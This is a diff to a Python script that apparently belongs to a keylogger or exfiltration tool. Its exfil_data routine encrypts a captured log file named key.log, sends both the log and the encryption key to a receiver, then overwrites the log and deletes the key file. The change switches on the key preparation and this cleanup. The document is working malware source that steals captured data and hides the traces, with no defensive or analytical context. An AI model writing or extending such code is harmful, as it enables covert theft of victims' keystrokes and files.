@@ -24,8 +24,9 @@ def encrypt_logs():
         logfile.write(symm_encrypt(data))
 
 
-def del_logs():
-    open(log_file, 'wb').write(b'')
+def del_logs(tmp_log):
+    open(log_file, 'wb').write(tmp_log)
+    os.remove('fernet.enc')
 
 
 def send_data(file, recv_fname, data=None):
@@ -50,11 +51,11 @@ def send_data(file, recv_fname, data=None):
 
 
 def exfil_data():
-    # prep_key()
+    prep_key()
     encrypt_logs()
     send_data(log_file, 'key.log')
-    send_data('fernet.key', 'fernet.key')
-    # del_logs()
+    send_data('fernet.enc', 'fernet.key')
+    del_logs(b'hello world')
 
 
 exfil_data()
